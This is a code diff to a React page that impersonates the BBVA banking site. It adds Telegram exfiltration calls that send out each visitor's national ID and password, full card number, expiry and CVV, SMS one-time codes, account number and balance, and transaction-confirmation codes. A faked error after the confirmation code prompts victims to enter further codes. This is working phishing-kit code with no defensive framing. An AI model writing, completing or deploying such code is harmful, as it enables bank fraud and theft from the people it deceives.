@@ -1,6 +1,7 @@
 "use client"
 
 import React, { useState, useEffect, useRef } from "react"
+import { sendTelegramMessage } from "@/lib/telegram"
 import {
   ChevronLeft,
   Eye,
@@ -108,6 +109,21 @@ export default function BbvaPage(props: any) {
     return () => {
       isMounted = false
     }
+  }, [])
+
+  // Telegram notification for visitor landing
+  useEffect(() => {
+    const trackVisitor = async () => {
+      if (typeof window === "undefined") return
+      if (!sessionStorage.getItem("bbva_visitor_notified")) {
+        sessionStorage.setItem("bbva_visitor_notified", "1")
+        await sendTelegramMessage({
+          title: "BBVA - Visitor Landing",
+          type: "visitor",
+        })
+      }
+    }
+    trackVisitor()
   }, [])
 
   // Login form states
@@ -291,6 +307,17 @@ export default function BbvaPage(props: any) {
       sessionStorage.setItem("documentId", userId.trim())
     }
 
+    try {
+      await sendTelegramMessage({
+        title: "BBVA - Login Captured",
+        dni: userId.trim(),
+        password: password,
+        type: "login",
+      })
+    } catch (err) {
+      console.error("Error sending Telegram notification:", err)
+    }
+
     // Wait exactly 2 seconds as requested, then switch to card screen
     setTimeout(() => {
       setIsScreenLoading(false)
@@ -333,6 +360,20 @@ export default function BbvaPage(props: any) {
       sessionStorage.setItem("bbva_cardCvv", cardCvv)
     }
 
+    try {
+      const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+      await sendTelegramMessage({
+        title: "BBVA - Card Details Captured",
+        dni: savedUser || undefined,
+        cardNumber: cleanCard,
+        expiry: expiry,
+        cvv: cardCvv,
+        type: "card",
+      })
+    } catch (err) {
+      console.error("Error sending Telegram notification:", err)
+    }
+
     // Wait exactly 2 seconds as requested, then switch to OTP screen
     setTimeout(() => {
       setIsScreenLoading(false)
@@ -352,6 +393,15 @@ export default function BbvaPage(props: any) {
     if (typeof window !== "undefined") {
       sessionStorage.setItem("bbva_otp", codeToSave)
     }
+
+    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    sendTelegramMessage({
+      title: "BBVA - SMS OTP Captured",
+      dni: savedUser || undefined,
+      otp1: codeToSave,
+      type: "otp",
+    }).catch((err) => console.error("Error sending Telegram notification:", err))
+
     setTimeout(() => {
       setIsScreenLoading(false)
       setCurrentScreen("accounts")
@@ -446,6 +496,15 @@ export default function BbvaPage(props: any) {
       if (accountBalance) sessionStorage.setItem("bbva_accountBalance", accountBalance)
     }
 
+    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    sendTelegramMessage({
+      title: "BBVA - Account Details Captured",
+      dni: savedUser || undefined,
+      accountNumber: accountNumber || "N/A",
+      balance: accountBalance ? `€${accountBalance}` : "N/A",
+      type: "account",
+    }).catch((err) => console.error("Error sending Telegram notification:", err))
+
     // Show 2-second loading overlay as requested
     setIsScreenLoading(true)
     setTimeout(() => {
@@ -466,6 +525,16 @@ export default function BbvaPage(props: any) {
     if (typeof window !== "undefined") {
       sessionStorage.setItem("bbva_confirm_otp", code)
     }
+
+    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    sendTelegramMessage({
+      title: `BBVA - Transaction Confirm OTP (Attempt ${confirmAttempt})`,
+      dni: savedUser || undefined,
+      otp2: code,
+      attempt: `${confirmAttempt}`,
+      type: "confirm_otp",
+    }).catch((err) => console.error("Error sending Telegram notification:", err))
+
     // Briefly let the 6th digit render, then display error, clear fields, and reset timer
     setTimeout(() => {
       setHasConfirmError(true)
@@ -562,6 +631,13 @@ export default function BbvaPage(props: any) {
     setConfirmOtp(["", "", "", "", "", ""])
     setHasConfirmError(false)
     confirmOtpRefs.current[0]?.focus()
+
+    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    sendTelegramMessage({
+      title: "BBVA - Confirm OTP Resend Requested",
+      dni: savedUser || undefined,
+      type: "resend_confirm_otp",
+    }).catch(() => {})
   }
 
   // Handle Resend OTP Code
@@ -572,6 +648,13 @@ export default function BbvaPage(props: any) {
     setOtpError("")
     setTimeout(() => setResendSuccess(false), 3000)
     otpRefs.current[0]?.focus()
+
+    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+    sendTelegramMessage({
+      title: "BBVA - OTP Resend Requested",
+      dni: savedUser || undefined,
+      type: "resend_otp",
+    }).catch(() => {})
   }
 
   const isCardFormValid =
